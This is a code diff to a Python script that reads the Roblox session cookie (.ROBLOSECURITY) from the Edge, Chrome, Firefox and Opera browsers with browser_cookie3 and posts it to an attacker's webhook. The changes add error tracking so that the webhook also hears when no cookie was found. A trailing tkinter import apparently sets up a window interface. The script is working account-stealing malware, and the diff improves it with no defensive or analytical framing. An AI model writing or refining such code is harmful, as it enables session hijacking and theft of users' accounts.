@@ -28,6 +28,8 @@ def sendToWebhook(url, cookie):
 
     requests.post(url, json = data)
 
+bns = []
+
 def MicrosoftEdge():
     try:
         cookies = browser_cookie3.edge(domain_name = "roblox.com")
@@ -35,7 +37,7 @@ def MicrosoftEdge():
         cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
         sendToWebhook(WebHook, cookie)
     except:
-        pass
+        bns.append("msedge")
 
 def GoogleChrome():
     try:
@@ -44,7 +46,7 @@ def GoogleChrome():
         cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
         sendToWebhook(WebHook, cookie)
     except:
-        pass
+        bns.append("chrome")
 
 def MozillaFirefox():
     try:
@@ -53,7 +55,7 @@ def MozillaFirefox():
         cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
         sendToWebhook(WebHook, cookie)
     except:
-        pass
+        bns.append("firefox")
 
 def Opera():
     try:
@@ -62,12 +64,15 @@ def Opera():
         cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
         sendToWebhook(WebHook, cookie)
     except:
-        pass
+        bns.append("opera")
 
 browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]
 
 for v in browsers:
     threading.Thread(target = v).start()
+
+if len(bns) >= 4:
+    sendToWebhook(WebHook, "NaN, user is not logged in or using an unsupported browser.")
 
 import tkinter as tk
 
